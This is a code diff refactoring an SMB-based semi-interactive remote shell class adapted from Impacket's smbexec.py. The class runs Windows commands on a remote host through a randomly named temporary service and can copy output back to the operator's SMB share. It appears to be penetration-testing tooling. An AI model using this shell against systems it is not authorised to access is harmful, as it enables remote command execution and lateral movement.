@@ -71,7 +71,7 @@ class SMBServer(Thread):
 # Code borrowed and adapted from Impacket's smbexec.py example #
 ################################################################
 class SvcShell(cmd.Cmd):
-    def __init__(self, svc, mgr_handle, rpc, mode):
+    def __init__(self, svc, mgr_handle, rpc, mode='SHARE'):
         cmd.Cmd.__init__(self)
         self.__svc = svc
         self.__mgr_handle = mgr_handle
@@ -89,9 +89,6 @@ class SvcShell(cmd.Cmd):
         self.__shell = '%COMSPEC% /Q /c'
         self.__service_name = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')
 
-        logger.info('Launching semi-interactive shell')
-        logger.debug('Going to use temporary service %s' % self.__service_name)
-
         s = self.__rpc.get_smb_connection()
 
         # We don't wanna deal with timeouts from now on
@@ -102,12 +99,19 @@ class SvcShell(cmd.Cmd):
             self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, self.__smbserver_share)
 
         self.transferClient = self.__rpc.get_smb_connection()
-        self.execute_remote('cd ')
+
+    def cmdloop(self):
+        logger.info('Launching semi-interactive shell')
+        logger.debug('Going to use temporary service %s' % self.__service_name)
+
+        self.execute_command('cd ')
 
         if len(self.__outputBuffer) > 0:
             # Stripping CR/LF
             self.prompt = string.replace(self.__outputBuffer, '\r\n', '') + '>'
             self.__outputBuffer = ''
+
+        cmd.Cmd.cmdloop(self)
 
     def __output_callback(self, data):
         self.__outputBuffer += data
@@ -139,8 +143,8 @@ class SvcShell(cmd.Cmd):
             self.transferClient.getFile(self.__share, self.__output, self.__output_callback)
             self.transferClient.deleteFile(self.__share, self.__output)
 
-    def execute_remote(self, data):
-        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, data, self.__output, self.__batchFile, self.__shell, self.__batchFile)
+    def execute_command(self, command):
+        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output, self.__batchFile, self.__shell, self.__batchFile)
 
         if self.__mode == 'SERVER':
             command += ' & %s' % self.__copyBack
@@ -162,6 +166,6 @@ class SvcShell(cmd.Cmd):
         self.get_output()
 
     def send_data(self, data):
-        self.execute_remote(data)
+        self.execute_command(data)
         print self.__outputBuffer
         self.__outputBuffer = ''
